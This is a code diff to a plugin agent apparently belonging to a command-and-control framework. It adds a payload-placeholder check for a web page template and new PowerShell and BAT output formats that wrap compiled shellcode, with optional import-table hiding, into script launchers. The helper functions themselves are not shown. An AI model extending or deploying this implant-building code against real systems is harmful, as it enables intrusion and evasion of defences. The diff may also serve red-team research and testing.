@@ -426,6 +426,9 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 
 			WebPageOutput, _ := listenerMap["page-payload"].(string)
 			ansOffset1 := strings.Index(WebPageOutput, "<<<PAYLOAD_DATA>>>")
+			if ansOffset1 < 0 {
+				return nil, errors.New("page-payload must contain '<<<PAYLOAD_DATA>>>'")
+			}
 			ansOffset2 := len(WebPageOutput[ansOffset1+len("<<<PAYLOAD_DATA>>>"):])
 
 			rotationMode := 0 // 0=sequential, 1=random
@@ -697,6 +700,30 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 				lFlags += " -Wl,-e,DllMain"
 			}
 		}
+	} else if generateConfig.Format == "PowerShell" {
+		Files += ObjectDir + "/main_shellcode" + Ext
+		lFlags += " -shared"
+		buildPath = tempDir + "/file.dll"
+		Filename += ".ps1"
+		if generateConfig.IatHiding {
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_DllMain@12"
+			} else {
+				lFlags += " -Wl,-e,DllMain"
+			}
+		}
+	} else if generateConfig.Format == "BAT" {
+		Files += ObjectDir + "/main_shellcode" + Ext
+		lFlags += " -shared"
+		buildPath = tempDir + "/file.dll"
+		Filename += ".bat"
+		if generateConfig.IatHiding {
+			if generateConfig.Arch == "x86" {
+				lFlags += " -Wl,-e,_DllMain@12"
+			} else {
+				lFlags += " -Wl,-e,DllMain"
+			}
+		}
 	} else {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", errors.New("unknown file format")
@@ -724,12 +751,20 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 	_ = os.RemoveAll(tempDir)
 
-	if generateConfig.Format == "Shellcode" {
+	if generateConfig.Format == "Shellcode" || generateConfig.Format == "PowerShell" || generateConfig.Format == "BAT" {
 		stubContent, err := os.ReadFile(stubPath)
 		if err != nil {
 			return nil, "", err
 		}
-		Payload = append(stubContent, buildContent...)
+		rawShellcode := append(stubContent, buildContent...)
+		switch generateConfig.Format {
+		case "Shellcode":
+			Payload = rawShellcode
+		case "PowerShell":
+			Payload = buildPowerShellScript(rawShellcode)
+		case "BAT":
+			Payload = buildBatScript(rawShellcode)
+		}
 	} else {
 		Payload = buildContent
 	}
